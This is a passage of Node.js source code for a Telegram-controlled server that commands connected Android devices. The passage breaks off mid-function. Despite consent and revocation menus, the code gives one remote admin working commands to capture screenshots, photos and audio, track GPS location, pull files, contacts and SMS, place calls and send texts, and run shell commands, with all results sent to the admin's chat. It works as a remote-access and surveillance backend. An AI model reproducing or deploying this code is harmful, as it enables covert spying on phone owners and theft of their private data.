require('dotenv').config();
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const https = require('https');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const helmet = require('helmet');
const NodeCache = require('node-cache');
const rateLimit = require('express-rate-limit');

// ============================================
// CONFIGURATION
// ============================================
const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 8999;

// Security check
if (!token || token.includes('AAHGZy_dy804ZwHoq48SnIK_OadCN2wcQxA')) {
    console.error('❌ SECURITY ALERT: Using compromised token! Regenerate via @BotFather');
    process.exit(1);
}

// ============================================
// EXPRESS SETUP
// ============================================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true });

// Fix for Render/Proxy - trust first proxy
app.set('trust proxy', 1);

// Middleware
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(express.json({ limit: '50mb' }));

// Rate limiting - FIXED for proxy
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    validate: {
        xForwardedForHeader: false,
        trustProxy: false
    }
});
app.use('/api/', apiLimiter);

// ============================================
// CACHE & DATA STRUCTURES
// ============================================
const commandCache = new NodeCache({ stdTTL: 2 });
const messageCache = new NodeCache({ stdTTL: 5 });
let bot = null;
const connectedDevices = new Map();
const pendingCommands = new Map();
const userSessions = new Map();

// ============================================
// DIRECTORY CREATION
// ============================================
['uploads', 'logs', 'screenshots', 'recordings', 'photos', 'temp'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// ============================================
// FILE UPLOAD CONFIGURATION
// ============================================
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.headers['file-type'] || 'unknown';
        let dir = `uploads/${type}`;
        
        if (type.includes('screenshot')) dir = 'screenshots';
        else if (type.includes('audio') || type.includes('recording')) dir = 'recordings';
        else if (type.includes('photo') || type.includes('camera')) dir = 'photos';
        else if (type.includes('jpg') || type.includes('jpeg') || type.includes('png')) dir = 'photos';
        
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.headers['device-id'] || 'unknown';
        const timestamp = Date.now();
        const ext = path.extname(file.originalname);
        const safeName = `${deviceId}-${timestamp}${ext}`;
        cb(null, safeName);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 }, // 100MB limit
    fileFilter: (req, file, cb) => {
        const allowedTypes = [
            'image/jpeg', 'image/png', 'image/gif',
            'video/mp4', 'video/3gpp', 'video/avi', 'video/quicktime',
            'audio/mpeg', 'audio/mp3', 'audio/wav', 'audio/ogg',
            'application/pdf', 'text/plain',
            'application/vnd.android.package-archive',
            'application/octet-stream'
        ];
        
        if (allowedTypes.includes(file.mimetype) || 
            /\.(jpg|jpeg|png|gif|mp4|3gp|avi|mov|mp3|wav|ogg|txt|pdf|apk)$/i.test(file.originalname)) {
            cb(null, true);
        } else {
            cb(new Error('File type not allowed'), false);
        }
    }
});

// ============================================
// HELPER FUNCTIONS
// ============================================

// Logging
function logEvent(event, deviceId = 'system', details = '') {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] [${deviceId}] ${event}: ${details}\n`;
    
    if (event.includes('ERROR')) {
        console.error('\x1b[31m%s\x1b[0m', logEntry.trim());
    } else if (event.includes('CONNECTED')) {
        console.log('\x1b[32m%s\x1b[0m', logEntry.trim());
    } else if (event.includes('COMMAND')) {
        console.log('\x1b[36m%s\x1b[0m', logEntry.trim());
    } else if (event.includes('RESPONSE')) {
        console.log('\x1b[35m%s\x1b[0m', logEntry.trim());
    } else if (event.includes('FILE')) {
        console.log('\x1b[33m%s\x1b[0m', logEntry.trim());
    } else {
        console.log(logEntry.trim());
    }
    
    try {
        fs.appendFileSync('logs/server.log', logEntry);
    } catch (e) {}
}

// Telegram API helper (no axios)
function telegramRequest(method, params = {}) {
    return new Promise((resolve, reject) => {
        const queryString = Object.keys(params)
            .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
            .join('&');
        
        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${token}/${method}${queryString ? '?' + queryString : ''}`,
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    reject(e);
                }
            });
        });

        req.on('error', reject);
        req.end();
    });
}

// Send long messages (Telegram 4096 limit)
async function sendLongMessage(chatId, text, parseMode = 'Markdown') {
    const MAX_LENGTH = 4096;
    
    if (text.length <= MAX_LENGTH) {
        return await bot.sendMessage(chatId, text, { parse_mode: parseMode }).catch(e => {});
    }
    
    const tempFile = path.join(__dirname, 'temp', `output_${Date.now()}.txt`);
    fs.writeFileSync(tempFile, text.replace(/\*|`|_/g, ''));
    
    return await bot.sendDocument(chatId, tempFile, {
        caption: `📄 Output (${Math.ceil(text.length / 1024)}KB)`
    }).then(() => {
        setTimeout(() => {
            if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile);
        }, 60000);
    }).catch(e => {});
}

// Format bytes
function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

// Session management
function setUserSession(userId, data) {
    userSessions.set(userId, { ...data, timestamp: Date.now() });
}

function getUserSession(userId) {
    return userSessions.get(userId);
}

function clearUserSession(userId) {
    userSessions.delete(userId);
}

// ============================================
// KEYBOARD DEFINITIONS
// ============================================

// MAIN KEYBOARD - Only 2 buttons
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📱 Devices' }],
            [{ text: '❓ Help' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

// DEVICE SELECTION KEYBOARD
const deviceSelectionKeyboard = (devices) => {
    const buttons = [];
    devices.forEach((device, id) => {
        const model = device.deviceInfo?.model?.split(' ')[0] || 'Android';
        const shortId = id.substring(0, 4);
        buttons.push([{ text: `📱 ${model} (${shortId})` }]);
    });
    buttons.push([{ text: '🔙 Back' }]);
    
    return {
        reply_markup: {
            keyboard: buttons,
            resize_keyboard: true,
            one_time_keyboard: true
        }
    };
};

// THE ONE AND ONLY DEVICE ACTION MENU - ALL 18 ACTIONS
const deviceActionMenu = (deviceId) => ({
    reply_markup: {
        inline_keyboard: [
            [
                { text: 'ℹ️ Info', callback_data: `info_${deviceId}` },
                { text: '📱 Apps', callback_data: `apps_${deviceId}` }
            ],
            [
                { text: '📸 Screenshot', callback_data: `screenshot_${deviceId}` },
                { text: '📷 Camera', callback_data: `camera_${deviceId}` },
                { text: '🎤 Record', callback_data: `record_${deviceId}` }
            ],
            [
                { text: '📍 Location', callback_data: `location_${deviceId}` },
                { text: '📁 Browse', callback_data: `browse_${deviceId}` },
                { text: '📥 Download', callback_data: `download_${deviceId}` }
            ],
            [
                { text: '📞 Call', callback_data: `call_${deviceId}` },
                { text: '💬 SMS', callback_data: `sms_${deviceId}` }
            ],
            [
                { text: '📒 Contacts', callback_data: `contacts_${deviceId}` },
                { text: '📨 Messages', callback_data: `messages_${deviceId}` }
            ],
            [
                { text: '🖥️ Shell', callback_data: `shell_${deviceId}` },
                { text: '🔐 Privacy', callback_data: `privacy_${deviceId}` }
            ],
            [
                { text: '🚫 Revoke', callback_data: `revoke_${deviceId}` },
                { text: '⚠️ Revoke All', callback_data: `revoke_all_${deviceId}` }
            ]
        ]
    }
});

// Camera selection menu
const cameraMenu = (deviceId) => ({
    reply_markup: {
        inline_keyboard: [
            [
                { text: '📷 Front Camera', callback_data: `camera_front_${deviceId}` },
                { text: '📷 Rear Camera', callback_data: `camera_rear_${deviceId}` }
            ]
        ]
    }
});

// Record duration menu
const recordMenu = (deviceId) => ({
    reply_markup: {
        inline_keyboard: [
            [
                { text: '5s', callback_data: `record_5_${deviceId}` },
                { text: '10s', callback_data: `record_10_${deviceId}` },
                { text: '30s', callback_data: `record_30_${deviceId}` }
            ],
            [
                { text: '1m', callback_data: `record_60_${deviceId}` },
                { text: '5m', callback_data: `record_300_${deviceId}` },
                { text: '10m', callback_data: `record_600_${deviceId}` }
            ]
        ]
    }
});

// Revoke consent menu
const revokeMenu = (deviceId) => ({
    reply_markup: {
        inline_keyboard: [
            [
                { text: '📍 Location', callback_data: `revoke_LOCATION_${deviceId}` },
                { text: '📷 Camera', callback_data: `revoke_CAMERA_${deviceId}` }
            ],
            [
                { text: '🎤 Microphone', callback_data: `revoke_MICROPHONE_${deviceId}` },
                { text: '📒 Contacts', callback_data: `revoke_CONTACTS_${deviceId}` }
            ],
            [
                { text: '💬 SMS', callback_data: `revoke_SMS_${deviceId}` },
                { text: '📞 Calls', callback_data: `revoke_CALL_LOG_${deviceId}` }
            ],
            [
                { text: '📁 Storage', callback_data: `revoke_STORAGE_${deviceId}` },
                { text: '📸 Screenshot', callback_data: `revoke_SCREENSHOT_${deviceId}` }
            ]
        ]
    }
});

// REMOVE KEYBOARD
const removeKeyboard = { 
    reply_markup: { remove_keyboard: true } 
};

// ============================================
// BOT COMMANDS - ALL 20 VISIBLE
// ============================================
async function setupBotCommands() {
    if (!bot) return;
    
    const commands = [
        { command: 'start', description: '🚀 Start DMA bot' },
        { command: 'help', description: '❓ Show help' },
        { command: 'keyboard', description: '⌨️ Show keyboard' },
        { command: 'list', description: '📱 List devices' },
        { command: 'info', description: 'ℹ️ Device info (ID)' },
        { command: 'screenshot', description: '📸 Take screenshot (ID)' },
        { command: 'camera', description: '📷 Take photo (ID + front/rear)' },
        { command: 'record', description: '🎤 Record audio (ID + seconds)' },
        { command: 'location', description: '📍 Get location (ID)' },
        { command: 'browse', description: '📁 Browse files (ID)' },
        { command: 'download', description: '📥 Download file (ID + path)' },
        { command: 'call', description: '📞 Make call (ID + number)' },
        { command: 'sms', description: '💬 Send SMS (ID + number + text)' },
        { command: 'contacts', description: '📒 Get contacts (ID)' },
        { command: 'messages', description: '📨 Get messages (ID)' },
        { command: 'apps', description: '📱 List apps (ID)' },
        { command: 'shell', description: '🖥️ Run command (ID + cmd)' },
        { command: 'privacy', description: '🔐 View consents (ID)' },
        { command: 'revoke', description: '🚫 Revoke consent (ID + type)' },
        { command: 'revoke_all', description: '⚠️ Revoke all (ID)' }
    ];

    try {
        await bot.setMyCommands(commands);
        console.log('✅ 20 commands registered successfully');
    } catch (error) {
        console.error('❌ Failed to set commands:', error.message);
    }
}

// ============================================
// BOT INITIALIZATION
// ============================================
async function initializeBot() {
    return new Promise((resolve, reject) => {
        try {
            bot = new TelegramBot(token, {
                polling: true,
                onlyFirstMatch: true,
                filepath: false,
                request: { 
                    agentOptions: { 
                        keepAlive: true, 
                        family: 4 
                    } 
                }
            });

            bot.getMe().then((me) => {
                console.log(`✅ Bot connected: @${me.username}`);
                resolve(bot);
            }).catch(reject);

            bot.on('polling_error', (error) => {
                if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
                    console.error('\n❌ Another bot instance is running!');
                    console.error('💡 Run: killall node');
                    bot.stopPolling();
                } else {
                    console.error('⚠️ Polling error:', error.message);
                }
            });

        } catch (error) {
            reject(error);
        }
    });
}

async function startBot() {
    try {
        const webhookInfo = await telegramRequest('getWebhookInfo');
        if (webhookInfo.ok && webhookInfo.result.url) {
            console.log('⚠️ Bot has active webhook. Deleting...');
            await telegramRequest('deleteWebhook', { drop_pending_updates: true });
            console.log('✅ Webhook deleted');
        }
        
        await initializeBot();
        setupBotCommandHandlers();
        await setupBotCommands();
        return bot;
    } catch (error) {
        console.error('❌ Bot start failed:', error.message);
        return null;
    }
}

// ============================================
// WEBSOCKET SERVER
// ============================================
wss.on('connection', (ws, req) => {
    try {
        const deviceId = req.headers['device-id'];
        const deviceModel = req.headers['device-model'] || 'Unknown';
        const androidVersion = req.headers['android-version'] || 'Unknown';
        const manufacturer = req.headers['manufacturer'] || 'Unknown';
        const brand = req.headers['brand'] || 'Unknown';
        
        if (!deviceId || !req.headers['authorization']) {
            return ws.close(1008, 'Unauthorized');
        }

        const deviceInfo = {
            id: deviceId,
            model: deviceModel,
            manufacturer: manufacturer,
            brand: brand,
            android: androidVersion,
            connectedAt: new Date().toISOString(),
            lastSeen: Date.now()
        };

        ws.deviceId = deviceId;
        
        connectedDevices.set(deviceId, { 
            ws, 
            deviceInfo, 
            lastSeen: Date.now(),
            consents: new Map()
        });

        if (bot) {
            bot.sendMessage(adminId, 
                `📱 *Device Connected*\n` +
                `Model: \`${deviceModel}\`\n` +
                `Android: ${androidVersion}\n` +
                `ID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }

        logEvent('DEVICE_CONNECTED', deviceId, `${deviceModel} (${androidVersion})`);

        ws.on('message', (data) => {
            try {
                const msg = JSON.parse(data.toString());
                logEvent('DEVICE_MESSAGE', deviceId, `Type: ${msg.type}`);
                handleDeviceMessage(deviceId, msg);
            } catch (e) {
                logEvent('ERROR', deviceId, `Parse error: ${e.message}`);
            }
            const dev = connectedDevices.get(deviceId);
            if (dev) dev.lastSeen = Date.now();
        });

        ws.on('close', () => {
            connectedDevices.delete(deviceId);
            if (bot) {
                bot.sendMessage(adminId, 
                    `📴 *Device Disconnected*\n\`${deviceId.substring(0, 8)}...\``, 
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
            }
            logEvent('DEVICE_DISCONNECTED', deviceId);
        });

        // Request device info immediately
        const cmdId = uuidv4();
        const command = {
            type: 'command',
            id: cmdId,
            command: 'get_device_info',
            timestamp: Date.now()
        };
        
        pendingCommands.set(cmdId, { deviceId, command: 'get_device_info', timestamp: Date.now() });
        ws.send(JSON.stringify(command));
        logEvent('COMMAND_SENT', deviceId, 'get_device_info');

    } catch (error) {
        logEvent('ERROR', 'system', `WebSocket connection error: ${error.message}`);
        ws.close(1011, 'Server error');
    }
});

// ============================================
// DEVICE MESSAGE HANDLERS
// ============================================
function handleDeviceMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) {
        logEvent('ERROR', deviceId, 'Device not found in connected devices');
        return;
    }

    switch (message.type) {
        case 'response':
            handleCommandResponse(deviceId, message);
            break;
        case 'device_info':
            updateDeviceInfo(deviceId, message.data);
            break;
        case 'consent_status':
            updateConsentStatus(deviceId, message.data);
            break;
        case 'transparency_log':
            handleTransparencyLog(deviceId, message.data);
            break;
        case 'file_upload':
            handleFileUpload(deviceId, message);
            break;
        case 'error':
            logEvent('ERROR', deviceId, message.error);
            if (bot) {
                bot.sendMessage(adminId, 
                    `❌ *Device Error*\n\`${deviceId.substring(0, 8)}...\`\n\`${message.error}\``, 
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
            }
            break;
        default:
            logEvent('WARNING', deviceId, `Unknown message type: ${message.type}`);
    }
}

function updateDeviceInfo(deviceId, info) {
    const device = connectedDevices.get(deviceId);
    if (device) {
        device.deviceInfo = { ...device.deviceInfo, ...info };
        logEvent('DEVICE_INFO', deviceId, 'Device info updated');
    }
}

function updateConsentStatus(deviceId, data) {
    const device = connectedDevices.get(deviceId);
    if (device && data.consents) {
        try {
            const consents = JSON.parse(data.consents);
            consents.forEach(c => device.consents.set(c.type, c));
            
            if (bot) {
                let msg = `🔐 *Consents - ${device.deviceInfo?.model || deviceId.substring(0, 6)}*\n━━━━━━━━━━━━━\n`;
                consents.forEach(c => {
                    msg += `• ${c.type}: ${c.active ? '✅' : '❌'}\n`;
                    if (c.revokedAt) {
                        msg += `  ⏰ Revoked: ${new Date(c.revokedAt).toLocaleString()}\n`;
                    }
                });
                bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
            }
        } catch (e) {
            logEvent('ERROR', deviceId, `Failed to parse consents: ${e.message}`);
        }
    }
}

function handleTransparencyLog(deviceId, data) {
    const device = connectedDevices.get(deviceId);
    if (!device || !data.log) return;
    
    try {
        const logs = JSON.parse(data.log).slice(0, 15);
        let msg = `📋 *Activity Log - ${device.deviceInfo?.model || deviceId.substring(0, 6)}*\n━━━━━━━━━━━━━\n`;
        
        logs.forEach((e, i) => {
            const time = new Date(e.timestamp).toLocaleString();
            msg += `${i+1}. [${time}]\n`;
            msg += `   Action: ${e.action}\n`;
            msg += `   Details: ${e.details.substring(0, 100)}\n`;
            msg += `   Status: ${e.status}\n\n`;
        });
        
        sendLongMessage(adminId, msg);
    } catch (e) {
        logEvent('ERROR', deviceId, `Failed to parse transparency log: ${e.message}`);
    }
}

function handleFileUpload(deviceId, message) {
    logEvent('FILE_UPLOAD_NOTIFICATION', deviceId, `Type: ${message.fileType || 'Unknown'}`);
}

// ============================================
// COMMAND RESPONSE HANDLER
// ============================================
function handleCommandResponse(deviceId, response) {
    const device = connectedDevices.get(deviceId);
    const model = device?.deviceInfo?.model?.split(' ')[0] || deviceId.substring(0, 6);
    
    logEvent('RESPONSE', deviceId, `Command: ${response.commandId || 'unknown'}, Success: ${response.success}`);
    
    if (!bot) {
        logEvent('ERROR', 'system', 'Bot not initialized');
        return;
    }
    
    if (!response.success) {
        bot.sendMessage(adminId, 
            `❌ *Command Failed*\nDevice: ${model}\nError: ${response.error || 'Unknown error'}`,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
        return;
    }

    // Location response
    if (response.data && response.data.lat !== undefined && response.data.lng !== undefined) {
        bot.sendLocation(adminId, response.data.lat, response.data.lng).then(() => {
            const url = `https://maps.google.com/?q=${response.data.lat},${response.data.lng}`;
            bot.sendMessage(adminId, 
                `📍 *Location - ${model}*\n` +
                `Latitude: \`${response.data.lat}\`\n` +
                `Longitude: \`${response.data.lng}\`\n` +
                `Accuracy: ±${response.data.accuracy || '?'}m`,
                { 
                    parse_mode: 'Markdown',
                    reply_markup: { 
                        inline_keyboard: [[{ text: '🗺️ Open Map', url }]] 
                    } 
                }
            ).catch(e => {});
        }).catch(e => {
            logEvent('ERROR', deviceId, `Failed to send location: ${e.message}`);
        });
    }
    
    // Device info response
    else if (response.data && response.data.device) {
        const msg = 
`📱 *Device Info - ${model}*
━━━━━━━━━━━━━
🤖 Android: ${response.data.android || 'Unknown'} (SDK ${response.data.sdk || '?'})
🔋 Battery: ${response.data.battery ? response.data.battery.toFixed(0) + '%' : 'Unknown'}
💾 Storage: ${formatBytes(response.data.internal_free)} free / ${formatBytes(response.data.internal_total)} total
📦 Apps: ${response.data.apps_count || 0} installed
📶 Network: ${response.data.network_type || 'Unknown'} (${response.data.connected ? 'Connected' : 'Disconnected'})
━━━━━━━━━━━━━
ID: \`${deviceId}\``;
        bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
    }
    
    // Contacts response
    else if (response.data && response.data.contacts) {
        try {
            const contacts = JSON.parse(response.data.contacts);
            let msg = `📒 *Contacts - ${model}*\n━━━━━━━━━━━━━\nTotal: ${contacts.length}\n\n`;
            contacts.slice(0, 20).forEach((c, i) => {
                msg += `${i+1}. *${c.name || 'Unknown'}*: \`${c.number}\`\n`;
            });
            if (contacts.length > 20) {
                msg += `\n... and ${contacts.length - 20} more contacts`;
            }
            sendLongMessage(adminId, msg);
        } catch (e) {
            logEvent('ERROR', deviceId, `Failed to parse contacts: ${e.message}`);
            bot.sendMessage(adminId, `📒 *Contacts - ${model}*\nReceived ${response.data.contacts.length} contacts`).catch(e => {});
        }
    }
    
    // Apps response
    else if (response.data && response.data.apps) {
        try {
            const apps = JSON.parse(response.data.list);
            let msg = `📱 *Installed Apps - ${model}*\n━━━━━━━━━━━━━\nTotal: ${response.data.count}\n\n`;
            apps.slice(0, 30).forEach((a, i) => {
                const name = a.split('.').pop() || a;
                msg += `${i+1}. \`${name}\`\n`;
            });
            if (apps.length > 30) {
                msg += `\n... and ${apps.length - 30} more apps`;
            }
            sendLongMessage(adminId, msg);
        } catch (e) {
            logEvent('ERROR', deviceId, `Failed to parse apps: ${e.message}`);
            bot.sendMessage(adminId, `📱 *Apps - ${model}*\nTotal: ${response.data.count || 0}`).catch(e => {});
        }
    }
    
    // Messages response
    else if (response.data && response.data.messages) {
        try {
            const messages = JSON.parse(response.data.messages);
            let msg = `📨 *Recent Messages - ${model}*\n━━━━━━━━━━━━━\nTotal: ${messages.length}\n\n`;
            messages.slice(0, 10).forEach((m, i) => {
                msg += `${i+1}. From: \`${m.address || 'Unknown'}\`\n`;
                msg += `   ${m.body || ''}\n`;
                if (m.date) msg += `   ${new Date(m.date).toLocaleString()}\n`;
                msg += '\n';
            });
            sendLongMessage(adminId, msg);
        } catch (e) {
            logEvent('ERROR', deviceId, `Failed to parse messages: ${e.message}`);
        }
    }
    
    // Files list response
    else if (response.data && response.data.files) {
        try {
            const files = JSON.parse(response.data.files);
            let msg = `📁 *Files - ${model}*\n━━━━━━━━━━━━━\nPath: ${response.data.path || '/'}\n\n`;
            files.slice(0, 20).forEach((f, i) => {
                const icon = f.isDirectory ? '📁' : '📄';
                msg += `${i+1}. ${icon} ${f.name} (${formatBytes(f.size)})\n`;
            });
            if (files.length > 20) {
                msg += `\n... and ${files.length - 20} more items`;
            }
            sendLongMessage(adminId, msg);
        } catch (e) {
            logEvent('ERROR', deviceId, `Failed to parse files: ${e.message}`);
        }
    }
    
    // Shell command output
    else if (response.output !== undefined) {
        const output = response.output.substring(0, 1500);
        sendLongMessage(adminId, 
            `🖥️ *Command Output - ${model}*\n━━━━━━━━━━━━━\n\`\`\`\n${output}\n\`\`\``
        );
    }
    
    // Consent status
    else if (response.data && response.data.consents) {
        updateConsentStatus(deviceId, response.data);
    }
    
    // Transparency log
    else if (response.data && response.data.log) {
        handleTransparencyLog(deviceId, response.data);
    }
    
    // Call/SMS success
    else if (response.data && (response.data.call_made !== undefined || response.data.sms_sent !== undefined)) {
        let action = response.data.call_made ? '📞 Call' : '💬 SMS';
        let target = response.data.number || '';
        bot.sendMessage(adminId, 
            `✅ *${action} Successful*\nDevice: ${model}\nTarget: \`${target}\``,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    }
    
    // Generic success
    else {
        bot.sendMessage(adminId, 
            `✅ *Command Executed*\nDevice: ${model}`,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    }
    
    // Clean up pending command
    if (response.commandId) {
        pendingCommands.delete(response.commandId);
    }
}

// ============================================
// SEND COMMAND TO DEVICE
// ============================================
function sendCommandToDevice(deviceId, command, data = {}) {
    const device = connectedDevices.get(deviceId);
    if (!device) {
        logEvent('ERROR', deviceId, `Device not connected for command: ${command}`);
        return false;
    }
    
    const cmdId = uuidv4();
    const cmdObj = {
        type: 'command',
        id: cmdId,
        command: command,
        data: data,
        timestamp: Date.now()
    };
    
    try {
        device.ws.send(JSON.stringify(cmdObj));
        pendingCommands.set(cmdId, { deviceId, command, data, timestamp: Date.now() });
        logEvent('COMMAND_SENT', deviceId, `${command} (ID: ${cmdId.substring(0, 8)})`);
        return true;
    } catch (e) {
        logEvent('ERROR', deviceId, `Failed to send command ${command}: ${e.message}`);
        return false;
    }
}

// ============================================
// BOT COMMAND HANDLERS
// ============================================
function setupBotCommandHandlers() {
    if (!bot) return;

    // === START COMMAND ===
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) {
            return bot.sendMessage(chatId, '⛔ Unauthorized');
        }
        
        bot.sendMessage(chatId, 
            `🤖 *DMA Bot v2.0*\n━━━━━━━━━━━━━\n` +
            `📱 Connected Devices: ${connectedDevices.size}\n` +
            `⚡ Tap '📱 Devices' or type /list to begin`,
            { 
                parse_mode: 'Markdown',
                reply_markup: mainKeyboard.reply_markup 
            }
        ).catch(e => {});
    });

    // === HELP COMMAND ===
    bot.onText(/\/help/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const help = 
`🤖 *DMA Bot Commands*
━━━━━━━━━━━━━
Type / followed by any command:

*📱 DEVICE MANAGEMENT*
/list - Show all connected devices
/info [device_id] - Get detailed device info

*📸 MEDIA CAPTURE*
/screenshot [device_id] - Take screenshot
/camera [device_id] [front/rear] - Take photo
/record [device_id] [seconds] - Record audio

*📍 LOCATION & FILES*
/location [device_id] - Get GPS location
/browse [device_id] - Browse files
/download [device_id] [path] - Download file

*📞 COMMUNICATION*
/call [device_id] [number] - Make phone call
/sms [device_id] [number] [text] - Send SMS
/contacts [device_id] - Get contact list
/messages [device_id] - Get SMS messages

*📱 APPLICATIONS*
/apps [device_id] - List installed apps

*🖥️ ADVANCED*
/shell [device_id] [command] - Execute shell command

*🔐 PRIVACY*
/privacy [device_id] - View consent status
/revoke [device_id] [type] - Revoke specific consent
/revoke_all [device_id] - Revoke all consents

*❓ OTHER*
/keyboard - Show device selection keyboard
/help - Show this help message

━━━━━━━━━━━━━
💡 *Tip:* Select a device from 📱 Devices to see all actions in one menu!`;
        
        bot.sendMessage(chatId, help, { parse_mode: 'Markdown' }).catch(e => {});
    });

    // === KEYBOARD COMMAND ===
    bot.onText(/\/keyboard/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, '📭 No devices connected').catch(e => {});
        }
        
        bot.sendMessage(chatId, '📱 *Select a device:*', { 
            parse_mode: 'Markdown',
            reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
        }).catch(e => {});
    });

    // === LIST COMMAND ===
    bot.onText(/\/list/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        showDeviceList(chatId);
    });

    function showDeviceList(chatId) {
        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, '📭 No devices connected').catch(e => {});
        }
        
        let text = `📱 *Connected Devices (${connectedDevices.size})*\n━━━━━━━━━━━━━\n`;
        connectedDevices.forEach((d, id) => {
            const model = d.deviceInfo?.model?.split(' ')[0] || 'Unknown';
            const battery = d.deviceInfo?.battery ? `${d.deviceInfo.battery.toFixed(0)}%` : '?';
            const android = d.deviceInfo?.android || d.deviceInfo?.androidVersion || '?';
            text += `• *${model}* [${battery}]\n`;
            text += `  ID: \`${id}\`\n`;
            text += `  Android: ${android}\n\n`;
        });
        
        bot.sendMessage(chatId, text, { 
            parse_mode: 'Markdown',
            reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
        }).catch(e => {});
    }

    // === INFO COMMAND ===
    bot.onText(/\/info (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device \`${deviceId.substring(0, 8)}...\` not connected`, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'get_device_info')) {
            bot.sendMessage(chatId, `ℹ️ Requesting info from \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Failed to send command`).catch(e => {});
        }
    });

    // === SCREENSHOT COMMAND ===
    bot.onText(/\/screenshot (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'take_screenshot')) {
            bot.sendMessage(chatId, `📸 Taking screenshot...`).catch(e => {});
        }
    });

    // === LOCATION COMMAND ===
    bot.onText(/\/location (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'get_location')) {
            bot.sendMessage(chatId, `📍 Getting location...`).catch(e => {});
        }
    });

    // === APPS COMMAND ===
    bot.onText(/\/apps (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'list_apps')) {
            bot.sendMessage(chatId, `📱 Getting apps list...`).catch(e => {});
        }
    });

    // === CONTACTS COMMAND ===
    bot.onText(/\/contacts (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'list_contacts')) {
            bot.sendMessage(chatId, `📒 Getting contacts...`).catch(e => {});
        }
    });

    // === MESSAGES COMMAND ===
    bot.onText(/\/messages (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'get_messages')) {
            bot.sendMessage(chatId, `📨 Getting messages...`).catch(e => {});
        }
    });

    // === PRIVACY COMMAND ===
    bot.onText(/\/privacy (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
